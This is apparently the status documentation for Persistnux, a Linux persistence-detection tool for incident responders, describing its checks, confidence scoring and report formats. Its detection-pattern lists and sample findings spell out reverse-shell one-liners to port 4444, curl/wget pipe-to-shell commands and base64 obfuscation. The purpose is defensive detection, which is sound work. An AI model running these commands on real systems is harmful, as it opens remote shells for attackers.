# Persistnux - Current Status (v1.2.0)

## What This Tool Does

Persistnux scans a Linux system for **persistence mechanisms** - ways that malware maintains access after reboot or maintains execution. It generates a report in CSV and JSONL formats with confidence scores.

## Current Version: 1.2.0

**Release Date**: 2026-01-23

## Major Changes from v1.1 to v1.2

### What Changed
1. **Default output now shows ONLY suspicious findings** (MEDIUM/HIGH/CRITICAL confidence)
2. **Package manager integration** - checks if files are managed by dpkg/rpm
3. **Known-good service whitelist** - automatically skips common vendor services
4. **Command-line arguments** - `--help`, `--all`, `--min-confidence`
5. **Confidence downgrading** - package-managed files get lower confidence scores

### Why It Changed
- v1.1 output was overwhelming (200-500 findings on typical system)
- 95% of findings were legitimate, package-managed files (LOW confidence)
- Analysts had to manually filter to find actual threats
- Now: immediate focus on 15-30 suspicious items that need review

## How to Run It

```bash
# Default: Show only suspicious findings
sudo ./persistnux.sh

# Show help
./persistnux.sh --help

# Show everything (old v1.1 behavior)
sudo ./persistnux.sh --all

# Show only HIGH confidence findings
sudo ./persistnux.sh --min-confidence HIGH
```

## What It Detects

### 1. Systemd Services & Timers
**Location**: `/etc/systemd/system`, `/lib/systemd/system`, `/usr/lib/systemd/system`, etc.

**What it checks**:
- Service files (`.service`)
- Timer files (`.timer`)
- Socket files (`.socket`)

**What makes it suspicious**:
- Unmanaged (not installed by package manager)
- Contains: `curl`, `wget`, `nc`, `netcat`, `/tmp`, `/dev/tcp`, `/dev/udp`, `base64`
- Recently modified (<7 days) AND enabled
- Package-managed BUT contains suspicious patterns → downgraded to MEDIUM

**What gets filtered out**:
- Known vendor services: `systemd-*`, `dbus-*`, `snap.*`, `NetworkManager`, `ssh`, `cron`, `cups`, etc.

### 2. Cron Jobs
**Location**: `/etc/crontab`, `/etc/cron.d/*`, `/etc/cron.{daily,hourly,weekly,monthly}`, user crontabs

**What it checks**:
- System-wide cron files
- Periodic execution scripts
- User crontabs (if running as root)
- At jobs

**What makes it suspicious**:
- Contains download/execute patterns: `curl | bash`, `wget | sh`
- Contains reverse shells: `/dev/tcp/`, `nc -e`
- Contains obfuscation: `base64 -d`
- Recently created (<7 days)
- Unmanaged files

**What gets filtered out**:
- Package-managed cron jobs → downgraded to LOW (hidden by default)

### 3. Shell Profiles & RC Files
**Location**: `/etc/profile`, `/etc/profile.d/*`, `/etc/bash.bashrc`, `~/.bashrc`, `~/.zshrc`, etc.

**What it checks**:
- System-wide shell profiles
- User shell profiles
- Profile.d scripts

**What makes it suspicious**:
- Contains: `curl`, `wget`, `nc`, `eval`, `base64 -d`, `chmod +x`
- Executes network commands on login
- Downloads scripts on shell startup

### 4. SSH Keys & Configs
**Location**: `~/.ssh/authorized_keys`, `~/.ssh/config`, `/etc/ssh/sshd_config`

**What it checks**:
- Authorized SSH keys for all users
- SSH client configs
- SSH daemon config

**What makes it suspicious**:
- Unusual key entries
- Suspicious forwarding configs
- Recently added keys

### 5. Init Scripts & rc.local
**Location**: `/etc/rc.local`, `/etc/init.d/*`, `/etc/rc*.d/*`

**What it checks**:
- rc.local startup script
- SysV init scripts
- Runlevel scripts

**What makes it suspicious**:
- Contains download/execute commands
- Network operations in startup scripts

### 6. Kernel Modules & LD_PRELOAD
**Location**: `/etc/ld.so.preload`, `/etc/ld.so.conf.d/*`, loaded kernel modules

**What it checks**:
- LD_PRELOAD library injection configs
- Dynamic linker configurations
- Currently loaded kernel modules
- Module autoload configs

**What makes it suspicious**:
- Any LD_PRELOAD configuration (HIGH confidence - library injection technique)
- Unknown kernel modules

### 7. Additional Persistence
**Location**: XDG autostart, PAM configs, sudoers, MOTD

**What it checks**:
- XDG autostart entries (`.config/autostart`, `/etc/xdg/autostart`)
- PAM configuration files
- Sudoers configs
- MOTD scripts

**What makes it suspicious**:
- Unmanaged XDG autostart entries
- Modified PAM configs
- Unusual sudoers entries

## Confidence Scoring System

### How Confidence is Assigned

**Starting Point**:
- Most persistence mechanisms start at MEDIUM confidence

**Upgraded to HIGH if**:
- Contains reverse shell patterns: `bash -i >& /dev/tcp/`, `nc -e /bin/sh`
- Contains download-execute: `curl URL | bash`, `wget URL && chmod +x`
- Contains obfuscation: `base64 -d | bash`, `eval $(echo ...)`
- Executes from `/tmp` or `/dev/shm`
- Recently modified (<7 days) AND in sensitive location

**Downgraded if**:
- File is package-managed by dpkg/rpm:
  - HIGH → MEDIUM
  - MEDIUM → LOW

**Set to LOW if**:
- Standard system file with no suspicious content
- Package-managed with no suspicious patterns

### What Each Confidence Means

| Level | Meaning | Default Visibility | Typical Count |
|-------|---------|-------------------|---------------|
| **LOW** | Baseline system config, package-managed, no suspicious patterns | ❌ Hidden | 150-400 |
| **MEDIUM** | Potentially suspicious, requires review, or package-managed with minor flags | ✅ Shown | 10-20 |
| **HIGH** | Suspicious patterns detected, unmanaged, or recent modifications | ✅ Shown | 5-10 |
| **CRITICAL** | Reserved for future use (multiple HIGH indicators combined) | ✅ Shown | 0 |

## Output Files

When you run the tool, it creates:

```
persistnux_output/
├── persistnux_<hostname>_<timestamp>.csv
└── persistnux_<hostname>_<timestamp>.jsonl
```

### CSV Format
```csv
timestamp,category,subcategory,persistence_type,location,description,confidence,sha256,metadata,additional_info
2026-01-23T10:30:00Z,Systemd,Service,systemd_service,/etc/systemd/system/backdoor.service,"Service: backdoor.service | Status: enabled | ExecStart: /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444'",HIGH,abc123...,mode:644|owner:root:root|...,enabled=enabled|days_old=2|package=unmanaged
```

### JSONL Format
```json
{"timestamp":"2026-01-23T10:30:00Z","hostname":"webserver01","category":"Systemd","subcategory":"Service","persistence_type":"systemd_service","location":"/etc/systemd/system/backdoor.service","description":"Service: backdoor.service | Status: enabled | ExecStart: /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444'","confidence":"HIGH","sha256":"abc123...","metadata":"mode:644|owner:root:root|...","additional_info":"enabled=enabled|days_old=2|package=unmanaged"}
```

### Key Fields

| Field | Description |
|-------|-------------|
| `timestamp` | When the finding was detected (UTC) |
| `category` | Main category (Systemd, Cron, ShellProfile, SSH, etc.) |
| `subcategory` | Subcategory (Service, System, User, etc.) |
| `persistence_type` | Specific type (systemd_service, cron_script, etc.) |
| `location` | Full file path |
| `description` | Human-readable description with key details |
| `confidence` | LOW, MEDIUM, HIGH, or CRITICAL |
| `sha256` | SHA256 hash of the file (for IOC matching) |
| `metadata` | File permissions, owner, size, timestamps |
| `additional_info` | Extra context: enabled status, age, package status |

## Suspicious Patterns Detected

### Network-Based (Reverse Shells)
- `bash -i >& /dev/tcp/IP/PORT`
- `bash -i >& /dev/udp/IP/PORT`
- `sh -i >$ /dev/tcp/IP/PORT`
- `nc -e /bin/sh`
- `/bin/sh | nc`
- `socat exec:'bash -li'`
- `telnet IP PORT | /bin/bash`
- `xterm -display IP:DISPLAY`

### Download and Execute
- `curl URL | bash`
- `curl URL | sh`
- `wget URL | bash`
- `wget URL | sh`
- `curl URL -o /tmp/file && chmod +x`
- `wget -O /tmp/file URL && chmod +x`

### Obfuscation
- `base64 -d | bash`
- `echo BASE64 | base64 -d | sh`
- `eval $(echo BASE64 | base64 -d)`
- `python -c 'import base64; exec(base64.b64decode(...))'`

### Suspicious Locations
- `/tmp/`
- `/var/tmp/`
- `/dev/shm/`
- Hidden directories (starting with `.`)

### Permission Manipulation
- `chmod +x /tmp/file`
- `chmod 777`
- `chmod u+s` (setuid)

## Package Manager Integration

### How It Works

For each file detected, the tool checks:

**Debian/Ubuntu**:
```bash
dpkg -S /path/to/file
```

**RedHat/CentOS/Fedora**:
```bash
rpm -qf /path/to/file
```

**Result in Output**:
- `package=dpkg:openssh-server` → File managed by openssh-server package
- `package=rpm:systemd` → File managed by systemd package
- `package=unmanaged` → File NOT managed by any package (more suspicious)

### Confidence Adjustment

```
Original: HIGH confidence (suspicious pattern detected)
Check: File is package-managed
Result: Downgraded to MEDIUM

Original: MEDIUM confidence (unusual but could be legit)
Check: File is package-managed
Result: Downgraded to LOW (hidden by default)
```

## Known-Good Service Whitelist

These services are **automatically skipped** (never shown, even with `--all`):

```
systemd-*          (all systemd internal services)
dbus-*             (D-Bus services)
snap.*             (Snap package services)
snapd.*            (Snapd daemon)
NetworkManager     (network management)
ssh                (SSH daemon)
cron               (cron daemon)
accounts-daemon    (user account management)
anacron            (anacron service)
apparmor           (AppArmor security)
apt-*              (APT package manager services)
avahi-*            (mDNS/DNS-SD)
bluetooth          (Bluetooth daemon)
cups               (printing)
gdm                (GNOME display manager)
lightdm            (LightDM display manager)
polkit             (PolicyKit)
rsyslog            (system logging)
ufw                (uncomplicated firewall)
wpa_supplicant     (WiFi authentication)
...and 10+ more
```

**Why**: These are standard vendor services on every Linux distribution. Including them adds noise without value.

## Filter Modes

### Default: suspicious_only

```bash
sudo ./persistnux.sh
```

**Shows**:
- MEDIUM confidence
- HIGH confidence
- CRITICAL confidence

**Hides**:
- LOW confidence

**Typical Output**: 15-30 findings

### Mode: all

```bash
sudo ./persistnux.sh --all
```

**Shows**:
- Everything (LOW, MEDIUM, HIGH, CRITICAL)

**Typical Output**: 200-500 findings

### Mode: HIGH only

```bash
sudo ./persistnux.sh --min-confidence HIGH
```

**Shows**:
- HIGH confidence
- CRITICAL confidence

**Hides**:
- LOW confidence
- MEDIUM confidence

**Typical Output**: 5-10 findings

## Real-World Examples

### Example 1: Malicious Systemd Service (HIGH)

```csv
2026-01-23T10:30:00Z,Systemd,Service,systemd_service,/etc/systemd/system/update-daemon.service,"Service: update-daemon.service | Status: enabled | ExecStart: /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444'",HIGH,e3b0c44...,mode:644|owner:root:root|size:256|modified:1706014800,enabled=enabled|days_old=2|package=unmanaged
```

**Why HIGH**:
- ✅ Reverse shell pattern detected (`/dev/tcp/`)
- ✅ Unmanaged (not from package)
- ✅ Recently created (2 days ago)
- ✅ Enabled (runs on boot)

**Action**: Investigate immediately

---

### Example 2: Package-Managed Cron (LOW - Hidden)

```csv
2026-01-23T10:30:00Z,Cron,System,cron_script,/etc/cron.daily/apt-compat,"Scheduled script: apt-compat",LOW,a3d5e8f...,mode:755|owner:root:root|size:512|modified:1705410000,days_old=120|package=dpkg:apt
```

**Why LOW**:
- ✅ Package-managed (`dpkg:apt`)
- ✅ No suspicious patterns
- ✅ Standard location
- ✅ Old file (120 days)

**Action**: None (hidden in default output)

---

### Example 3: Suspicious Cron Job (HIGH)

```csv
2026-01-23T10:30:00Z,Cron,System,cron_script,/etc/cron.d/freedesktop_timesync1,"Scheduled script: freedesktop_timesync1",HIGH,f7d3a2c...,mode:644|owner:root:root|size:128|modified:1706014800,content_preview=* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/127.0.0.1/4444|days_old=2|package=unmanaged
```

**Why HIGH**:
- ✅ Reverse shell pattern (`/dev/tcp/`)
- ✅ Unmanaged (not from package)
- ✅ Recently created (2 days ago)
- ✅ Suspicious filename (mimics legitimate service)

**Action**: Investigate immediately

---

### Example 4: Package-Managed Service with Curl (MEDIUM)

```csv
2026-01-23T10:30:00Z,Systemd,Service,systemd_service,/lib/systemd/system/monitoring-agent.service,"Service: monitoring-agent.service | Status: enabled | ExecStart: /usr/bin/curl https://monitoring.example.com/heartbeat",MEDIUM,b8e3f1d...,mode:644|owner:root:root|size:384|modified:1705410000,enabled=enabled|days_old=90|package=dpkg:monitoring-agent
```

**Why MEDIUM** (downgraded from HIGH):
- ⚠️ Contains `curl` (suspicious pattern)
- ✅ BUT package-managed (`dpkg:monitoring-agent`)
- ✅ Old file (90 days)

**Action**: Review - verify package legitimacy, check if monitoring-agent is expected

---

### Example 5: User Shell Profile (LOW - Hidden)

```csv
2026-01-23T10:30:00Z,ShellProfile,User,user_profile,/home/john/.bashrc,"User profile for john",LOW,c9a7f3e...,mode:644|owner:john:john|size:3771|modified:1703818800,user=john|package=unmanaged
```

**Why LOW**:
- ✅ No suspicious patterns
- ✅ Standard user profile
- ✅ Old file (200+ days)

**Action**: None (hidden in default output)

## What Gets Logged to Console

When running, you'll see:

```
    ____                  _       __
   / __ \___  __________(_)____/ /___  __  ___  __
  / /_/ / _ \/ ___/ ___/ / ___/ __/ / / / |/_/ |/_/
 / ____/  __/ /  (__  ) (__  ) /_/ /_/ />  <_>  <
/_/    \___/_/  /____/_/____/\__/\__,_/_/|_/_/|_|

    Linux Persistence Detection Tool v1.2.0
    For DFIR Investigations

[+] Filter Mode: Suspicious only (MEDIUM/HIGH/CRITICAL)

[+] Starting Linux persistence detection on webserver01 at Thu Jan 23 10:30:00 UTC 2026
[+] Running as user: root (UID: 0)

[+] Output directory: ./persistnux_output
[+] CSV output: ./persistnux_output/persistnux_webserver01_20260123_103000.csv
[+] JSONL output: ./persistnux_output/persistnux_webserver01_20260123_103000.jsonl

[+] Checking systemd services...
[FINDING] Suspicious systemd service: /etc/systemd/system/backdoor.service

[+] Checking cron jobs and scheduled tasks...
[FINDING] Suspicious cron job: /etc/cron.d/freedesktop_timesync1

[+] Checking shell profiles and RC files...

[+] Checking SSH keys and configurations...

[+] Checking init scripts and rc.local...

[+] Checking kernel modules and LD_PRELOAD...

[+] Checking additional persistence mechanisms...

================================
Scan Summary
================================
Total Findings: 23
HIGH Confidence: 2
MEDIUM Confidence: 21
LOW Confidence: 387 (hidden in suspicious_only mode)

[+] Analysis completed at Thu Jan 23 10:35:00 UTC 2026
```

**Note**: Only HIGH confidence findings trigger `[FINDING]` console alerts. MEDIUM findings are written to output files silently.

## Current Limitations

1. **No offline analysis** - must run on live system
2. **No YARA integration** - no binary malware detection
3. **No container detection** - doesn't detect Docker/Podman persistence
4. **No GRUB/bootloader checks** - boot-level persistence not covered
5. **No initramfs analysis** - early-boot persistence not detected
6. **Basic pattern matching** - may miss advanced obfuscation
7. **No network validation** - doesn't verify if reverse shell IPs are malicious
8. **No threat intelligence** - doesn't check hashes against known malware databases

## Files in This Repository

```
persistnux/
├── persistnux.sh                              # Main script (1,300+ lines)
├── README.md                                  # Installation & usage
├── CHANGELOG.md                               # Version history
├── CURRENT_STATUS.md                          # This file
├── CONTRIBUTING.md                            # Contribution guidelines
├── DFIR_GUIDE.md                              # Incident response workflows
├── FILTERING_GUIDE.md                         # Filtering documentation
├── SUSPICIOUS_INDICATORS.md                   # Pattern definitions
├── FALSE_POSITIVE_REDUCTION_STRATEGY.md       # Technical design doc
├── MISSING_PERSISTENCE_MECHANISMS.md          # Future enhancements
├── .gitignore                                 # Git ignore rules
└── examples/
    ├── example_output.csv                     # Sample CSV output
    └── example_output.jsonl                   # Sample JSONL output
```

## Quick Reference Commands

```bash
# Help
./persistnux.sh --help

# Default scan (suspicious only)
sudo ./persistnux.sh

# Show everything
sudo ./persistnux.sh --all

# HIGH confidence only
sudo ./persistnux.sh --min-confidence HIGH

# Custom output directory
sudo OUTPUT_DIR=/tmp/evidence ./persistnux.sh

# Analyze CSV output
grep ",HIGH," persistnux_*.csv
awk -F',' '$10 ~ /package=unmanaged/' persistnux_*.csv

# Analyze JSONL output
jq 'select(.confidence == "HIGH")' persistnux_*.jsonl
jq 'select(.additional_info | contains("package=unmanaged"))' persistnux_*.jsonl
jq -r '.confidence' persistnux_*.jsonl | sort | uniq -c
```

## Summary

**Persistnux v1.2.0** is a production-ready Linux persistence detection tool that:

✅ Detects 7+ categories of persistence mechanisms
✅ Filters out noise by default (suspicious-only mode)
✅ Integrates with package managers to reduce false positives
✅ Provides actionable output with confidence scoring
✅ Generates DFIR-ready CSV and JSONL reports
✅ Works on all major Linux distributions
✅ Runs with or without root (limited scope without root)

**Best Use Cases**:
- Incident response investigations
- Threat hunting on Linux servers
- Post-compromise analysis
- Security audits
- Malware analysis

**Not Suitable For**:
- Real-time monitoring (it's a point-in-time scan)
- Offline forensic image analysis (requires live system)
- Container security (doesn't detect container-specific persistence)
- Rootkit detection (use chkrootkit/rkhunter for that)
